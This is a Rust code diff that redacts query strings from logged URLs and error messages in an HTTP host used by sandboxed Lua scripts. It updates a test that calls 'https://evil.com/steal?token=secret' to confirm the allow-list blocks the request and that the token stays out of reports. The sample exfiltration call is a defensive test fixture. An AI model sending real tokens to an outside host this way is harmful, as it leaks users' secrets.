@@ -13,7 +13,7 @@ use wreq_util::Profile;
 
 use super::super::cookies::Cookie;
 use super::super::models::RunOptions;
-use super::super::reports::Recorder;
+use super::super::reports::{Recorder, redact_url};
 use super::super::stop::StopSignal;
 
 /// Builds a fresh cookie jar pre-populated from `cookies` (as previously
@@ -152,7 +152,7 @@ fn ensure_domain_allowed_or_record(
     if let Err(message) = super::ensure_domain_allowed(url, allowed_domains) {
         recorder.record(
             "error",
-            json!({ "action": action, "url": url, "message": message.clone() }),
+            json!({ "action": action, "url": redact_url(url), "message": message.clone() }),
         );
         return Err(mlua::Error::RuntimeError(message));
     }
@@ -177,8 +177,8 @@ fn record_redirects(recorder: &Recorder, method: &str, resp: &wreq::Response) {
             json!({
                 "method": method,
                 "status": hop.status.as_u16(),
-                "from": hop.previous.to_string(),
-                "to": hop.uri.to_string(),
+                "from": redact_url(&hop.previous.to_string()),
+                "to": redact_url(&hop.uri.to_string()),
             }),
         );
     }
@@ -365,7 +365,7 @@ pub(super) fn table(
                 "http_request",
                 json!({
                     "method": "DOWNLOAD",
-                    "url": url,
+                    "url": redact_url(&url),
                     "status": status,
                     "content_type": content_type.clone(),
                     "bytes_len": bytes.len(),
@@ -398,7 +398,7 @@ fn read_body(
         let mut stream = resp.bytes_stream();
         let mut body = Vec::new();
         while let Some(chunk) = stream.next().await {
-            let chunk = chunk?;
+            let chunk = chunk.map_err(wreq::Error::without_uri)?;
             if body.len() + chunk.len() > max_bytes {
                 return Err(
                     crate::Error::from(crate::ErrorKind::ScriptLimitExceeded(format!(
@@ -496,7 +496,9 @@ impl HttpHost {
     ) -> LuaResult<wreq::Response> {
         self.stop
             .block_on(&self.runtime, request.send())?
-            .map_err(|err| self.record_error(action, url, err))
+            // `wreq` appends the request's full URI to its messages, query
+            // string included: the report records a redacted one instead.
+            .map_err(|err| self.record_error(action, url, err.without_uri()))
     }
 
     /// Sends `request` for `get`/`post_form`/`post_json` and returns its
@@ -520,7 +522,7 @@ impl HttpHost {
 
         let mut entry = json!({
             "method": method,
-            "url": url,
+            "url": redact_url(url),
             "status": status,
             "duration_ms": started.elapsed().as_millis(),
         });
@@ -547,7 +549,7 @@ impl HttpHost {
     ) -> mlua::Error {
         self.recorder.record(
             "error",
-            json!({ "action": action, "url": url, "message": err.to_string() }),
+            json!({ "action": action, "url": redact_url(url), "message": err.to_string() }),
         );
         mlua::Error::external(err)
     }
@@ -585,13 +587,19 @@ mod tests {
         lua.globals().set("http", http_table).unwrap();
 
         let result: LuaResult<Table> = lua
-            .load(r#"return http.get("https://evil.com/steal")"#)
+            .load(r#"return http.get("https://evil.com/steal?token=secret")"#)
             .eval();
 
-        assert!(result.is_err());
+        let err = result.unwrap_err().to_string();
+        assert!(!err.contains("secret"), "{err}");
         let report = recorder.finish();
         assert_eq!(report.entries.len(), 1);
         assert_eq!(report.entries[0].event, "error");
+        assert_eq!(
+            report.entries[0].value["url"],
+            "https://evil.com/steal?[redacted]"
+        );
+        assert!(!report.entries[0].value.to_string().contains("secret"));
     }
 
     /// Spawns a tiny local server that unconditionally 302-redirects every
